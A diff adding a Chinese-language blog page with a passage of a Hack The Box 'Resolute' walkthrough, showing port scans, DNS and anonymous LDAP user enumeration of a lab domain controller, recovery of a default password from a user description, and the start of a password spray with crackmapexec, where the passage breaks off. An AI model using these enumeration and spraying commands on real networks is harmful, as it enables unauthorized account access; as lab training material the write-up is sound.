@@ -1,0 +1,363 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>打靶记录(一四四)之HTBResolute | MikannseのSekai</title><meta name="author" content="Mikannse"><meta name="copyright" content="Mikannse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="端口扫描┌──(mikannse㉿kali)-[~&#x2F;HTB&#x2F;resolute]└─$ sudo nmap --min-rate&#x3D;10000 -p- 10.10.10.169Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-09-13 19:33 CSTWarning: 10.10.10.169 giving up on port because">
+<meta property="og:type" content="article">
+<meta property="og:title" content="打靶记录(一四四)之HTBResolute">
+<meta property="og:url" content="http://mikannse.space/2024/09/13/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%9B%9B%E5%9B%9B)%E4%B9%8BHTBResolute/index.html">
+<meta property="og:site_name" content="MikannseのSekai">
+<meta property="og:description" content="端口扫描┌──(mikannse㉿kali)-[~&#x2F;HTB&#x2F;resolute]└─$ sudo nmap --min-rate&#x3D;10000 -p- 10.10.10.169Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-09-13 19:33 CSTWarning: 10.10.10.169 giving up on port because">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg">
+<meta property="article:published_time" content="2024-09-13T14:30:43.000Z">
+<meta property="article:modified_time" content="2024-09-13T14:31:48.888Z">
+<meta property="article:author" content="Mikannse">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="windows">
+<meta property="article:tag" content="Domain">
+<meta property="article:tag" content="打靶">
+<meta property="article:tag" content="ldap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg"><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="http://mikannse.space/2024/09/13/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%9B%9B%E5%9B%9B)%E4%B9%8BHTBResolute/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Mikannse","link":"链接: ","source":"来源: MikannseのSekai","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '打靶记录(一四四)之HTBResolute',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: undefined,
+  isToc: true,
+  postUpdate: '2024-09-13 22:31:48'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (true) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MikannseのSekai"><span class="site-name">MikannseのSekai</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">打靶记录(一四四)之HTBResolute</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-09-13T14:30:43.000Z" title="发表于 2024-09-13 22:30:43">2024-09-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-09-13T14:31:48.888Z" title="更新于 2024-09-13 22:31:48">2024-09-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E5%AE%89/">网安</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>13分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="打靶记录(一四四)之HTBResolute"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/HTB/resolute]</span><br><span class="line">└─$ sudo nmap --min-rate=10000 -p- 10.10.10.169</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-13 19:33 CST</span><br><span class="line">Warning: 10.10.10.169 giving up on port because retransmission <span class="built_in">cap</span> hit (10).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.169</span><br><span class="line">Host is up (0.071s latency).</span><br><span class="line">Not shown: 65474 closed tcp ports (reset), 37 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">88/tcp    open  kerberos-sec</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">389/tcp   open  ldap</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">464/tcp   open  kpasswd5</span><br><span class="line">593/tcp   open  http-rpc-epmap</span><br><span class="line">636/tcp   open  ldapssl</span><br><span class="line">3268/tcp  open  globalcatLDAP</span><br><span class="line">3269/tcp  open  globalcatLDAPssl</span><br><span class="line">5985/tcp  open  wsman</span><br><span class="line">9389/tcp  open  adws</span><br><span class="line">47001/tcp open  winrm</span><br><span class="line">49664/tcp open  unknown</span><br><span class="line">49665/tcp open  unknown</span><br><span class="line">49666/tcp open  unknown</span><br><span class="line">49667/tcp open  unknown</span><br><span class="line">49671/tcp open  unknown</span><br><span class="line">49680/tcp open  unknown</span><br><span class="line">49681/tcp open  unknown</span><br><span class="line">49688/tcp open  unknown</span><br><span class="line">49712/tcp open  unknown</span><br><span class="line">50013/tcp open  unknown</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 17.38 seconds</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/HTB/resolute]</span><br><span class="line">└─$ sudo nmap -sT -sC -sV -O -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49680,49681,49688,49712,50052 10.10.10.169</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-13 19:38 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.169</span><br><span class="line">Host is up (0.074s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE  SERVICE      VERSION</span><br><span class="line">53/tcp    open   domain       Simple DNS Plus</span><br><span class="line">88/tcp    open   kerberos-sec Microsoft Windows Kerberos (server time: 2024-09-13 11:34:43Z)</span><br><span class="line">135/tcp   open   msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)</span><br><span class="line">464/tcp   open   kpasswd5?</span><br><span class="line">593/tcp   open   ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open   tcpwrapped</span><br><span class="line">3268/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open   tcpwrapped</span><br><span class="line">5985/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open   mc-nmf       .NET Message Framing</span><br><span class="line">47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49664/tcp open   msrpc        Microsoft Windows RPC</span><br><span class="line">49665/tcp open   msrpc        Microsoft Windows RPC</span><br><span class="line">49666/tcp open   msrpc        Microsoft Windows RPC</span><br><span class="line">49667/tcp open   msrpc        Microsoft Windows RPC</span><br><span class="line">49671/tcp open   msrpc        Microsoft Windows RPC</span><br><span class="line">49680/tcp open   ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49681/tcp open   msrpc        Microsoft Windows RPC</span><br><span class="line">49688/tcp open   msrpc        Microsoft Windows RPC</span><br><span class="line">49712/tcp open   msrpc        Microsoft Windows RPC</span><br><span class="line">50052/tcp closed unknown</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.94SVN%E=4%D=9/13%OT=53%CT=50052%CU=42043%PV=Y%DS=2%DC=I%G=Y%TM=</span><br><span class="line">OS:66E42469%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10D%TI=I%CI=I%II=I%S</span><br><span class="line">OS:S=S%TS=A)SEQ(SP=104%GCD=1%ISR=10D%TI=I%CI=RD%II=I%SS=S%TS=A)OPS(O1=M53CN</span><br><span class="line">OS:W8ST11%O2=M53CNW8ST11%O3=M53CNW8NNT11%O4=M53CNW8ST11%O5=M53CNW8ST11%O6=M</span><br><span class="line">OS:53CST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y</span><br><span class="line">OS:%T=80%W=2000%O=M53CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=</span><br><span class="line">OS:)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A</span><br><span class="line">OS:=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF</span><br><span class="line">OS:=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=</span><br><span class="line">OS:%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%</span><br><span class="line">OS:IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: &lt;blank&gt;</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">|_clock-skew: mean: 2h16m35s, deviation: 4h02m32s, median: -3m26s</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2024-09-13T11:35:43</span><br><span class="line">|_  start_date: 2024-09-13T11:22:15</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)</span><br><span class="line">|   Computer name: Resolute</span><br><span class="line">|   NetBIOS computer name: RESOLUTE\x00</span><br><span class="line">|   Domain name: megabank.local</span><br><span class="line">|   Forest name: megabank.local</span><br><span class="line">|   FQDN: Resolute.megabank.local</span><br><span class="line">|_  System time: 2024-09-13T04:35:46-07:00</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 79.73 seconds</span><br></pre></td></tr></tbody></table></figure>
+
+<p>找到域名:megabank.local</p>
+<h1 id="Enum"><a href="#Enum" class="headerlink" title="Enum"></a>Enum</h1><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/HTB/resolute]</span><br><span class="line">└─$ dig any @10.10.10.169 megabank.local </span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.20.1-1-Debian &lt;&lt;&gt;&gt; any @10.10.10.169 megabank.local</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; WARNING: .<span class="built_in">local</span> is reserved <span class="keyword">for</span> Multicast DNS</span><br><span class="line">;; You are currently testing what happens when an mDNS query is leaked to DNS</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- <span class="string">opcode: QUERY, status: NOERROR, id: 6199</span></span><br><span class="line"><span class="string">;; flags: qr aa rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">;; OPT PSEUDOSECTION:</span></span><br><span class="line"><span class="string">; EDNS: version: 0, flags:; udp: 4000</span></span><br><span class="line"><span class="string">;; QUESTION SECTION:</span></span><br><span class="line"><span class="string">;megabank.local.                        IN      ANY</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">;; ANSWER SECTION:</span></span><br><span class="line"><span class="string">megabank.local.         600     IN      A       10.10.10.169</span></span><br><span class="line"><span class="string">megabank.local.         3600    IN      NS      resolute.megabank.local.</span></span><br><span class="line"><span class="string">megabank.local.         3600    IN      SOA     resolute.megabank.local. hostmaster.megabank.local. 152 900 600 86400 3600</span></span><br><span class="line"><span class="string">megabank.local.         600     IN      AAAA    dead:beef::b803:885a:b665:b183</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">;; ADDITIONAL SECTION:</span></span><br><span class="line"><span class="string">resolute.megabank.local. 3600   IN      A       10.10.10.169</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">;; Query time: 71 msec</span></span><br><span class="line"><span class="string">;; SERVER: 10.10.10.169#53(10.10.10.169) (TCP)</span></span><br><span class="line"><span class="string">;; WHEN: Fri Sep 13 19:46:42 CST 2024</span></span><br><span class="line"><span class="string">;; MSG SIZE  rcvd: 173</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>似乎没有可以连接的smb共享，说明还需要进一步的枚举，尝试枚举用户名。</p>
+<p>一开始用的kerbrute,但是字典有点大，跑的有些慢，尝试用ldap来枚举</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/tools/domain/windapsearch]</span><br><span class="line">└─$ python windapsearch.py -d megabank.local --dc-ip 10.10.10.169 -U &gt;ldapresult</span><br><span class="line">[+] No username provided. Will try anonymous <span class="built_in">bind</span>.</span><br><span class="line">[+] Using Domain Controller at: 10.10.10.169</span><br><span class="line">[+] Getting defaultNamingContext from Root DSE</span><br><span class="line">[+]     Found: DC=megabank,DC=<span class="built_in">local</span></span><br><span class="line">[+] Attempting <span class="built_in">bind</span></span><br><span class="line">[+]     ...success! Binded as: </span><br><span class="line">[+]      None</span><br><span class="line"></span><br><span class="line">[+] Enumerating all AD <span class="built_in">users</span></span><br><span class="line">[+]     Found 25 <span class="built_in">users</span>: </span><br><span class="line"></span><br><span class="line">cn: Guest</span><br><span class="line"></span><br><span class="line">cn: DefaultAccount</span><br><span class="line"></span><br><span class="line">cn: Ryan Bertrand</span><br><span class="line">userPrincipalName: ryan@megabank.local</span><br><span class="line"></span><br><span class="line">cn: Marko Novak</span><br><span class="line">userPrincipalName: marko@megabank.local</span><br><span class="line"></span><br><span class="line">cn: Sunita Rahman</span><br><span class="line">userPrincipalName: sunita@megabank.local</span><br><span class="line"></span><br><span class="line">cn: Abigail Jeffers</span><br><span class="line">userPrincipalName: abigail@megabank.local</span><br><span class="line"></span><br><span class="line">cn: Marcus Strong</span><br><span class="line">userPrincipalName: marcus@megabank.local</span><br><span class="line"></span><br><span class="line">cn: Sally May</span><br><span class="line">userPrincipalName: sally@megabank.local</span><br><span class="line"></span><br><span class="line">cn: Fred Carr</span><br><span class="line">userPrincipalName: fred@megabank.local</span><br><span class="line"></span><br><span class="line">cn: Angela Perkins</span><br><span class="line">userPrincipalName: angela@megabank.local</span><br><span class="line"></span><br><span class="line">cn: Felicia Carter</span><br><span class="line">userPrincipalName: felicia@megabank.local</span><br><span class="line"></span><br><span class="line">cn: Gustavo Pallieros</span><br><span class="line">userPrincipalName: gustavo@megabank.local</span><br><span class="line"></span><br><span class="line">cn: Ulf Berg</span><br><span class="line">userPrincipalName: ulf@megabank.local</span><br><span class="line"></span><br><span class="line">cn: Stevie Gerrard</span><br><span class="line">userPrincipalName: stevie@megabank.local</span><br><span class="line"></span><br><span class="line">cn: Claire Norman</span><br><span class="line">userPrincipalName: claire@megabank.local</span><br><span class="line"></span><br><span class="line">cn: Paulo Alcobia</span><br><span class="line">userPrincipalName: paulo@megabank.local</span><br><span class="line"></span><br><span class="line">cn: Steve Rider</span><br><span class="line">userPrincipalName: steve@megabank.local</span><br><span class="line"></span><br><span class="line">cn: Annette Nilsson</span><br><span class="line">userPrincipalName: annette@megabank.local</span><br><span class="line"></span><br><span class="line">cn: Annika Larson</span><br><span class="line">userPrincipalName: annika@megabank.local</span><br><span class="line"></span><br><span class="line">cn: Per Olsson</span><br><span class="line">userPrincipalName: per@megabank.local</span><br><span class="line"></span><br><span class="line">cn: Claude Segal</span><br><span class="line">userPrincipalName: claude@megabank.local</span><br><span class="line"></span><br><span class="line">cn: Melanie Purkis</span><br><span class="line">userPrincipalName: melanie@megabank.local</span><br><span class="line"></span><br><span class="line">cn: Zach Armstrong</span><br><span class="line">userPrincipalName: zach@megabank.local</span><br><span class="line"></span><br><span class="line">cn: Simon Faraday</span><br><span class="line">userPrincipalName: simon@megabank.local</span><br><span class="line"></span><br><span class="line">cn: Naoki Yamamoto</span><br><span class="line">userPrincipalName: naoki@megabank.local</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Bye!</span><br></pre></td></tr></tbody></table></figure>
+
+<p>导出成一个用户字典</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/HTB/resolute]</span><br><span class="line">└─$ <span class="built_in">cat</span> ldapsult |grep userPrincipalName |awk -F <span class="string">' '</span> <span class="string">'{print $2}'</span> |awk -F <span class="string">'@'</span> <span class="string">'{print $1}'</span> &gt;username</span><br></pre></td></tr></tbody></table></figure>
+
+<p>用–full，能够展示所有的属性，那就导出用户的所有属性</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/tools/domain/windapsearch]</span><br><span class="line">└─$ python windapsearch.py -d megabank.local --dc-ip 10.10.10.169 -U --full |grep Password</span><br><span class="line">badPasswordTime: 0</span><br><span class="line">badPasswordTime: 0</span><br><span class="line">badPasswordTime: 133707043313373976</span><br><span class="line">description: Account created. Password <span class="built_in">set</span> to Welcome123!</span><br></pre></td></tr></tbody></table></figure>
+
+<p>找到了初始默认密码:Welcome123!,进行一个密码喷洒</p>
+<h1 id="Password-Spray"><a href="#Password-Spray" class="headerlink" title="Password Spray"></a>Password Spray</h1><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/HTB/resolute]</span><br><span class="line">└─$ crackmapexec smb 10.10.10.169 -u username -p pass --continue-on-success                </span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)</span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE 